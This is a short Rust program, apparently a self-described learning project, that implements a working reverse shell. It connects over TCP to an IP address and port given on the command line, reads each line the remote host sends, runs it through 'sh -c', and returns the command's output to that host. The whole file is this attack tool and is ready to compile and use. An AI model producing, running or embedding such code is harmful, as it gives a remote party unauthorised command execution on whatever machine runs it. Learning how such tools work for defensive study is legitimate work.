//
// This is a learning project so were gonna be overly verbose and list steps out
//
// Step 1 - collect args and validate
// collecting args - >https://doc.rust-lang.org/book/ch12-01-accepting-command-line-arguments.html
// Step 2 - connect to remote host (tcp client)
// tcp client -> https://www.rustfaq.org/en/how-to-build-a-tcp-client-in-rust/
// Step 3 - enter our command execution loop and send/receive data
// output -> https://doc.rust-lang.org/std/process/struct.Command.html#method.output


use std::net::{Ipv4Addr, TcpStream};
use std::env;
use std::process;
use std::io::{self, BufRead, Write, BufReader};
use std::process::Command;


//takes ipv4 string, checks if valid format
fn validate_ip(ip: &str) -> bool {
    match ip.parse::<Ipv4Addr>() {
        Ok(_ip) => {
            println!("[+] valid ipv4 address");
            true
        }
        Err(_err) => {
            eprintln!("[-] not valid ipv4 address");
            false
        }
    }
}

fn main() -> io::Result<()> {

    //collect command line args && validate
    let args: Vec<String> = env::args().collect();

    if args.len() != 3 {
        eprintln!("[-] Usage: {} <ipv4_address> <port>", args[0]);
        process::exit(1);
    }

    let ip = &args[1];
    let port = &args[2];

    if !validate_ip(ip) {
        eprintln!("[-] exiting program due to invalid IP address.");
        process::exit(1);
    }

    //validated, now connect to remote host

    let addr = ip.to_owned() + ":" + port;

    //debug to check addr
    println!("{}", addr);

    //send data to server
    let stream = TcpStream::connect(addr)?;
    println!("[+] we connected to a server!");

    //clone stream for independant read/write
    let mut writer = stream.try_clone()?;
    let mut reader = BufReader::new(stream);

    //our command execution loop

    loop{
        //send message
        writer.write_all(b">")?;
        writer.flush()?;

        //read response
        let mut response = String::new();
        reader.read_line(&mut response)?;

        let shell_command = Command::new("sh")
            .arg("-c")
            .arg(&response)
    //     .expect("failed to execute process")
            .output()?;

        writer.write_all(&shell_command.stdout);
        writer.write_all(&shell_command.stderr);
        writer.flush()?;
    }

    Ok(())

}